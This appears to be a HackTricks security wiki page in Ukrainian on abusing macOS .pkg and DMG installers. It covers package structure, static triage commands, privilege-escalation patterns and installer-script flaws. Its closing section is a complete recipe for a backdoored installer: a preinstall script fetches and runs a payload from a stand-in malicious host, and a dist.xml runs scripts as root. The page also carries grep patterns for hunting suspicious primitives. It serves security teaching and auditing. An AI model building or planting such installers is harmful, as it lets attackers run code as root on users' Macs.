# Abuse macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація про Pkg

**Пакет інсталятора** macOS (також відомий як файл `.pkg`) — це формат файлів, який macOS використовує для **розповсюдження програмного забезпечення**. Ці файли схожі на **коробку, що містить усе необхідне програмному забезпеченню** для правильного встановлення та роботи.

Сам файл пакета є архівом, який містить **ієрархію файлів і директорій, що будуть встановлені на цільовому** комп’ютері. Він також може містити **скрипти** для виконання завдань до та після встановлення, наприклад налаштування конфігураційних файлів або видалення старих версій програмного забезпечення.

### Структура пакета

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Налаштування (заголовок, текст привітання…) і перевірки скриптів/інсталяції
- **PackageInfo (xml)**: Інформація, вимоги до встановлення, місце встановлення, шляхи до скриптів для запуску
- **Bill of materials (bom)**: Список файлів для встановлення, оновлення або видалення з дозволами на файли
- **Payload (CPIO archive gzip compressed)**: Файли для встановлення в `install-location` із PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Скрипти до та після встановлення й додаткові ресурси, розпаковані в тимчасову директорію для виконання.

### Розпакування
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Щоб переглянути вміст інсталятора без ручної декомпресії, також можна скористатися безкоштовним інструментом [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Скорочення для статичного triage

Якщо метою є аналіз, спробуйте **не відкривати package через `Installer.app` спочатку**. Деякі package можуть виконувати code одразу після відкриття в Installer (наприклад, через `system.run()` або installer plug-ins), тому offline extraction зазвичай є безпечнішою відправною точкою.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Основна інформація про DMG

Файли DMG, або Apple Disk Images, — це формат файлів, який Apple macOS використовує для образів дисків. Файл DMG по суті є **образом диска, який можна підключити** (він містить власну файлову систему) і який містить необроблені блокові дані, зазвичай стиснені, а іноді зашифровані. Коли ви відкриваєте файл DMG, macOS **підключає його так, ніби це фізичний диск**, що дає змогу отримати доступ до його вмісту.

> [!CAUTION]
> Зверніть увагу, що інсталятори **`.dmg`** підтримують **дуже багато форматів**, тому в минулому деякі з них, що містили вразливості, використовувалися для отримання **виконання коду в ядрі**.

### Структура образу диска

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Ієрархія файлу DMG може відрізнятися залежно від вмісту. Однак для application DMG вона зазвичай має таку структуру:

- Верхній рівень: це корінь образу диска. Він часто містить application і, можливо, посилання на папку Applications.
- Application (.app): це власне application. У macOS application зазвичай є пакетом, який містить багато окремих файлів і папок, що утворюють application.
- Посилання Applications: це shortcut до папки Applications у macOS. Його призначення — спростити встановлення application. Щоб встановити app, можна перетягнути файл .app на цей shortcut.

## Privesc через зловживання pkg

### Виконання з публічних директорій

Якщо скрипт до- або післявстановлення виконує файл, наприклад **`/var/tmp/Installerutil`**, а attacker може замінити цей файл, він може підвищити привілеї, коли installer викличе його. У доповідях і walkthrough показано варіанти цього небезпечного патерну із зовнішнім скриптом.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Це [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), яку викликають деякі installers і updaters, щоб **виконати щось як root**. Ця function приймає як параметр **path** до **file**, який потрібно **виконати**. Однак якщо attacker може **змінити** цей file, він зможе **зловживати** його виконанням із правами root для **підвищення привілеїв**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Додаткову інформацію дивіться в цій доповіді: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Зловживання середовищем і shebang

Сучасні вразливості PackageKit показали, що скрипти інсталяторів часто виконуються як **довірений код root**, водночас поруч зберігається контекст, контрольований зловмисником. Під час аудиту пакетів постачальників звертайте особливу увагу на:

- Оболонки-інтерпретатори, як-от `#!/bin/zsh` / `#!/bin/bash`
- Виклики на кшталт `sudo -u $USER`, `launchctl asuser` або будь-яку логіку, що довіряє `$USER`, `$HOME`, `PATH`, `TMPDIR` чи відносним шляхам
- Не-shell інтерпретатори, які можуть завантажувати init-файли або бібліотеки, контрольовані користувачем
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Для bug PackageKit 2024 року в root-environment (`~/.zshenv` / `~/.bash*` успадковуються під час інсталяцій, ініційованих користувачем) див. [generic macOS privesc page](../macos-privilege-escalation.md). Якщо package **Apple-signed**, той самий script bug може стати **SIP/TCC-relevant**, оскільки `system_installd` може мати `com.apple.rootless.install.heritable`; див. [SIP page](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Виконання через монтування

Якщо installer записує до `/tmp/fixedname/bla/bla`, можна **створити mount** поверх `/tmp/fixedname` із noowners, щоб **змінювати будь-який файл під час інсталяції** та зловживати процесом інсталяції.

Прикладом є **CVE-2021-26089**, за допомогою якого вдалося **перезаписати periodic script** і отримати виконання від імені root. Докладніше див. у доповіді: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg як malware

### Порожній Payload

Можна просто створити файл **`.pkg`** із **pre та post-install scripts**, без будь-якого реального payload, окрім malware усередині scripts.<sup>[[2]](#references)</sup>

### JS у Distribution xml

У файл **distribution xml** package можна додати теги **`<script>`**, і цей code буде виконано; він може **виконувати команди** за допомогою **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

У distribution packages це зазвичай залежить від того, чи дозволяє файл верхнього рівня `Distribution` external scripts, наприклад за допомогою `allow-external-scripts="true"`. Тому перевірки лише `preinstall` / `postinstall` недостатньо: сам **Distribution XML** може містити hooks `installation-check` / `volume-check` і прямі шляхи виконання `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Шкідливий інсталятор, що використовує скрипт і JS-код усередині dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Розпакування Pkg: погляд усередину пакетів інсталятора macOS та поширені недоліки безпеки](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: «Дикий світ інсталяторів macOS» - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Розпакування Pkg: погляд усередину пакетів інсталятора MacOS](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming macOS: експлуатація пакетів інсталятора](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: підвищення привілеїв у macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Порушення SIP за допомогою пакетів, підписаних Apple](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: «Гора помилок» - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Смерть від 1000 інсталяторів у macOS, і все зламано!](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
